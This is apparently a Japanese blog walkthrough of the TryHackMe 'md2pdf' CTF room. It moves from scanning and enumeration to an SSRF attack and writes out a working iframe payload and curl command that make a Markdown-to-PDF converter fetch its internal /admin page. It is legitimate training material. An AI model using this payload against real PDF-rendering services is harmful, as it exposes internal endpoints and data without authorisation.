---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: md2pdf Walkthrough"
date: 2026-03-27T00:00:00+09:00
aliases: ["/TryHackMe/md2pdf"]
tags: ["TryHackMe", "CTF", "walkthrough", "SSRF", "iframe", "Flask"]
categories: ["TryHackMe"]
draft: false
cover:
    image: "/images/eyecatch/TryHackMe/md2pdf/index.png"
---

# このページでわかること

* TryHackMe ルーム「md2pdf」のWalkthrough
* SSRFによる内部ポートへのアクセス
* Markdownフォームを悪用したiframeインジェクション
* curlの `-F` と `--form-string` オプションの違いと注意点

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | md2pdf |
| 難易度 | Easy |
| カテゴリ | Web, SSRF |
| URL | https://tryhackme.com/room/md2pdf |

# 執筆時の環境

* OS: Ubuntu 20.04 (TryHackMe AttackBox)
* ツール: rustscan, gobuster, curl

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/md2pdf)
* [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

# 1. ポートスキャン

## 1-1. rustscan によるスキャン

```bash
rustscan -a 10.144.138.172 --ulimit 5000 -- -sV -sC
```

| ポート | 状態 | サービス | バージョン |
|-------|------|---------|-----------|
| 22/tcp | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80/tcp | open | HTTP | MD2PDF Webアプリ (Flask) |
| 5000/tcp | open | HTTP | MD2PDF Webアプリ (Flask) |

ポート80が公開フロントエンド、ポート5000がFlaskのデフォルトポートで動作している内部APIと判断できる。

---

# 2. Webアプリ調査

## 2-1. ポート80のフロントエンド

ポート80にアクセスするとMarkdownのテキストエリア (`<textarea name="md">`) と「Convert to PDF」ボタンが表示される。Markdownを入力してPDFに変換する機能を持つWebアプリだった。

* 変換エンドポイント: `POST /convert`
* PDF変換には wkhtmltopdf 系のレンダリングエンジンを使用していると推測

## 2-2. ディレクトリ列挙

```bash
gobuster dir -u http://10.144.138.172 -w /usr/share/wordlists/dirb/common.txt
```

| パス | ステータス | 備考 |
|------|-----------|------|
| /admin | 403 Forbidden | 外部からは拒否されているが存在は確認できた |
| /convert | 405 Method Not Allowed | POST以外を受け付けないエンドポイント |

`/admin` は外部から403が返るが、内部ネットワークからのアクセスなら通るかもしれない。ポート5000の内部APIにSSRFでアクセスできれば取得できると推測した。

---

# 3. 攻撃 (Exploitation)

## 3-1. SSRF + iframeインジェクション

### 攻撃の考え方

MarkdownはHTMLをそのまま通すため、`<iframe>` タグをペイロードとして注入できる。PDF変換処理の中でサーバーが自分自身の内部エンドポイント (`localhost:5000/admin`) へHTTPリクエストを送信させることで、外部から直接アクセスできない `/admin` の内容をPDFに埋め込ませる。

### ペイロード

```html
<iframe src="http://localhost:5000/admin" width="1000" height="1000"></iframe>
```

### curlでの実行

```bash
curl -v -X POST http://10.144.138.172/convert \
  --form-string 'md=<iframe src="http://localhost:5000/admin" width="1000" height="1000"></iframe>' \
  -o ssrf_test.pdf
```

> 注意: `-F` オプションでは `<` がファイル参照として解釈されるため正しくペイロードを送れない。文字列として送る場合は必ず `--form-string` を使用する。

### レスポンス

```
HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 8748
Content-Disposition: inline; filename=ticket.pdf
```

### 攻撃フロー

```
攻撃者 → POST /convert (iframeペイロードを含むMarkdown)
              ↓
         サーバーがPDF変換処理中に
         localhost:5000/admin へ内部リクエストを発行
              ↓
         /admin の内容がPDFに埋め込まれて返却
              ↓
         攻撃者がPDFを開いてFlagを確認
```

---

# 4. フラグ取得

生成された `ssrf_test.pdf` を開くと、`/admin` ページの内容がPDF内に描画されており、フラグが確認できた。

| フラグ | 取得方法 |
|--------|----------|
| flag | SSRFで取得した `/admin` ページの内容をPDFで確認 |

---

# 5. まとめ

## 攻略フロー

```
ポートスキャン (Rustscan)
  → HTTP(80), HTTP(5000), SSH(22) 発見
  → Gobuster で /admin (403), /convert (405) 発見
  → SSRFペイロード (iframeインジェクション)
  → localhost:5000/admin にアクセス
  → PDF内にFlagを確認
```

## 習得スキル

| スキル | 内容 |
|--------|------|
| 2層構成の把握 | ポート80（公開）とポート5000（内部）を使い分ける構成を見抜く |
| PDF変換とSSRF | wkhtmltopdf 系はHTMLレンダリング時に内部URLへ接続するためSSRFの温床になりやすい |
| iframeインジェクション | MarkdownがHTMLをそのまま通すため `<iframe>` タグが有効なSSRFベクタとなる |
| curl のオプション選択 | `-F` では `<` がファイル参照として解釈されるため、文字列送信には `--form-string` を使う |

## ハマったポイント

curlで `-F` オプションを使うと `<` がファイル読み込みとして解釈されてしまい、iframeタグを含むペイロードが正しく送れなかった。`--form-string` に切り替えることで解決した。この挙動はcurlのmultipart formデータにおける仕様であり、ファイルを送る場合と文字列を送る場合でオプションを使い分ける必要がある。
